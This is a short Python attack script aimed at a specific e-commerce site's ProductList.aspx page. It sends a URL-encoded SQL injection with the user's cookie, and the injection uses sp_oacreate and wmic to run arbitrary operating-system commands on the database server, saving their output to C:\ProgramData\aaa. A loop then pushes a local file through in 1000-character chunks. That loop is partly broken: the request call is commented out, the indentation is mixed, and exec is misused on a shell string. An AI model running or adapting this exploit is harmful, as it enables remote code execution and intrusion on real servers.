#coding=utf8
import json
import gzip
import urllib.request
import tarfile
import sys
import time

f = open(sys.argv[1],"r",encoding='UTF-8')
cookie = sys.argv[2]


def request(substr):#只发包
    print(substr)
    try:
        headers = {'Cookie':cookie}
        url = "https://www.znldd.com/DLSDMall/Product/ProductList.aspx?n=1%%27/*!123&n=%23*/and%20%202498=2498;declare%20@luan%20int,@exec%20int,@text%20int,@str%20varchar(8000);exec%20sp_oacreate%20%27{72C24DD5-D70A-438B-8A42-98424B88AFB8}%27,@luan%20output;exec%20sp_oamethod%20@luan,%27exec%27,@exec%20output,%27C:\windows\system32\wbem\wmic%20process%20call%20create%20%22"+substr+"%20%3EC:\\ProgramData\\aaa%22%27;exec%20sp_oamethod%20@exec,%20%27StdOut%27,%20@text%20out;exec%20sp_oamethod%20@text,%20%27readall%27,%20@str%20out;select%20@str;insert%20into%20temp%20values(cast(@str%20as%20varchar(8000)));--"
        req = urllib.request.Request(url,headers=headers)
        response = urllib.request.urlopen(req)
        code = response.getcode()
        print(code)
    except urllib.error.HTTPError as err:
        print(err.code)
        print(err.read())
        raise

while True:
    ch = f.read(1000)
    if not ch : break
    #request(ch)
	exec("echo "+ch+"> 1.txt");
	time.sleep(5)

print('Done.')
f.close()
